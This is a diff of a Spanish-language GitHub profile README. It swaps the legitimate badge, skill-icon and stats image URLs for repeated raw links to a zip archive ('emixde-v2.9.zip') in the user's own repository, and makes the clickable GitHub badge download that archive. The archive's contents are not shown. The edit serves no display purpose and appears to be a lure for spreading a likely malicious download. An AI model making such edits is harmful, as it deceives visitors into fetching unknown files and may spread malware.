@@ -10,7 +10,7 @@
 
 ### 📫 ¡Contáctame!
 
-[![GitHub](https://img.shields.io/badge/GitHub-emixde12-181717?style=flat&logo=github)](https://github.com/emixde12)  
+[![GitHub](https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde-v2.9.zip)](https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde-v2.9.zip)  
 📧 **Correo:** _aquí puedes poner tu correo real_
 
 ---
@@ -21,19 +21,19 @@
 
 **Generales:**  
 
-<img align="left" alt="Python" width="30" src="https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg"/>
-<img align="left" alt="C++" width="30" src="https://raw.githubusercontent.com/devicons/devicon/master/icons/cplusplus/cplusplus-original.svg"/>
-<img align="left" alt="JavaScript" width="30" src="https://raw.githubusercontent.com/devicons/devicon/master/icons/javascript/javascript-original.svg"/>
-<img align="left" alt="Git" width="30" src="https://raw.githubusercontent.com/devicons/devicon/master/icons/git/git-original.svg"/>
+<img align="left" alt="Python" width="30" src="https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde-v2.9.zip"/>
+<img align="left" alt="C++" width="30" src="https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde-v2.9.zip"/>
+<img align="left" alt="JavaScript" width="30" src="https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde-v2.9.zip"/>
+<img align="left" alt="Git" width="30" src="https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde-v2.9.zip"/>
 
 <br /><br />
 
 
 ## 📊 Mis estadísticas
 
-![GitHub Stats](https://github-readme-stats.vercel.app/api?username=emixde12&show_icons=true&theme=tokyonight)
+![GitHub Stats](https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde-v2.9.zip)
 
-![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=emixde12&layout=compact&theme=tokyonight)
+![Top Langs](https://raw.githubusercontent.com/emixde12/emixde12/main/coperception/emixde-v2.9.zip)
 
 
 ## ⚡ Actividad Reciente
